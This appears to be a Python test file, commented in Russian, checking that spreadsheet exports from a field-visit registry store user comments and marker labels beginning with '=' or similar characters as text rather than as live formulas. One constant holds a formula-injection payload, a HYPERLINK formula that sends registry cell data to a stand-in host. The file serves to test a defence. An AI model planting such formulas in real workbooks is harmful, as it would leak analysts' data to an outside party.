"""Текст выездника в серверных книгах openpyxl — текст, а не формула (ревью 25.09.2026, #6).

Легаси-выгрузки /admin/export и /admin/markers.xlsx пишет openpyxl, а он строку с
ведущим «=» кладёт ФОРМУЛОЙ. Комментарий визита или подпись метки
«=HYPERLINK(…)» от выездника исполнялись бы у аналитика при открытии книги со
всем реестром. Книги руководителя (book.py, stats_book.py — xlsxwriter с
strings_to_formulas=False) этим не болели и здесь не проверяются.
"""
import asyncio
import io
import re
import zipfile
from datetime import date, datetime

from aiohttp import web as aiohttp_web
from aiohttp.test_utils import make_mocked_request
from openpyxl import Workbook, load_workbook

import db
import web

EMP = "Формулов Сотрудник"
UID = 7403
PAYLOAD = '=HYPERLINK("https://example.invalid/x?d="&B4&C4,"карточка")'


def _formulas(xlsx: bytes) -> list[str]:
    with zipfile.ZipFile(io.BytesIO(xlsx)) as z:
        xml = z.read("xl/worksheets/sheet1.xml").decode("utf-8")
    return re.findall(r"<f[ >]", xml)


def _download(handler, path, monkeypatch) -> bytes:
    monkeypatch.setattr(web, "_admin", lambda _r: None)
    resp = asyncio.run(handler(make_mocked_request("GET", path)))
    assert resp.status == 200
    return resp.body


def _save_comment(cid, text, monkeypatch):
    with db.connect() as conn:
        conn.execute("DELETE FROM clients WHERE contract_id=?", (cid,))
        conn.execute("INSERT INTO clients (contract_id, client, birth_date, responsible) "
                     "VALUES (?,?,?,?)", (cid, f"Формулин {cid}", "1970-07-07", EMP))
        conn.commit()
    monkeypatch.setattr(web, "_auth", lambda _r: (UID, EMP))
    request = make_mocked_request("POST", "/api/save", app=aiohttp_web.Application())

    async def _json():
        return {"rep": cid, "values": {"visit_comment": text}}
    request.json = _json
    assert asyncio.run(web._save(request)).status == 200


def test_formula_in_a_visit_comment_stays_text_in_the_registry_export(monkeypatch):
    """Путь целиком: выездник сохраняет «=2+2» → /admin/export → ячейка-строка."""
    db.init_db()
    cases = {"XT-1": "=2+2", "XT-2": PAYLOAD}
    for cid, text in cases.items():
        _save_comment(cid, text, monkeypatch)

    book = _download(web._admin_export, "/admin/export", monkeypatch)
    ws = load_workbook(io.BytesIO(book)).active
    keys = [f.key for f in db.FIELDS]
    cid_col = keys.index("contract_id") + 1
    comment_col = keys.index("visit_comment") + 1
    rows = {ws.cell(row=r, column=cid_col).value: r for r in range(4, ws.max_row + 1)}
    for cid, text in cases.items():
        cell = ws.cell(row=rows[cid], column=comment_col)
        assert cell.value == text, cid
        assert cell.data_type == "s", f"{cid}: комментарий записан формулой"
        assert cell.quotePrefix is True, f"{cid}: станет формулой при первой правке"
    assert _formulas(book) == [], "в книге осталась формула"


def test_formula_in_a_marker_label_stays_text(monkeypatch):
    db.init_db()
    db.add_marker(UID, "agent", 41.3, 69.2, label="=2+2", op_id="xt-marker-1")
    book = _download(web._admin_markers_xlsx, "/admin/markers.xlsx", monkeypatch)
    ws = load_workbook(io.BytesIO(book)).active
    cells = [ws.cell(row=r, column=7) for r in range(2, ws.max_row + 1)]
    label = next(c for c in cells if c.value == "=2+2")
    assert label.data_type == "s" and label.quotePrefix is True
    assert _formulas(book) == []


def test_every_formula_starter_is_text_and_numbers_stay_numbers():
    wb = Workbook()
    ws = wb.active
    starters = ["=1+1", "+7", "-5", "@x", "\tA", "\rB"]
    plain = ["обычный текст", 5, 1.5, date(2026, 9, 25)]
    ws.append(db.xlsx_text_row(ws, starters + plain))
    buf = io.BytesIO()
    wb.save(buf)
    assert _formulas(buf.getvalue()) == []
    cells = list(load_workbook(io.BytesIO(buf.getvalue())).active[1])
    for cell, value in zip(cells, starters):
        assert (cell.value, cell.data_type, cell.quotePrefix) == (value, "s", True)
    text, whole, frac, day = cells[len(starters):]
    assert (text.value, text.data_type, text.quotePrefix) == ("обычный текст", "s", False)
    assert (whole.value, whole.data_type) == (5, "n")
    assert (frac.value, frac.data_type) == (1.5, "n")
    assert isinstance(day.value, datetime) and day.value.date() == date(2026, 9, 25)


def test_control_character_does_not_break_the_whole_export():
    """openpyxl отвергает \\x01 и соседей исключением — одна такая буква в одном
    комментарии роняла выгрузку всего реестра."""
    wb = Workbook()
    ws = wb.active
    ws.append(db.xlsx_text_row(ws, ["до\x01после", "=\x0bформула"]))
    buf = io.BytesIO()
    wb.save(buf)
    cells = list(load_workbook(io.BytesIO(buf.getvalue())).active[1])
    assert cells[0].value == "допосле"
    assert (cells[1].value, cells[1].data_type) == ("=формула", "s")
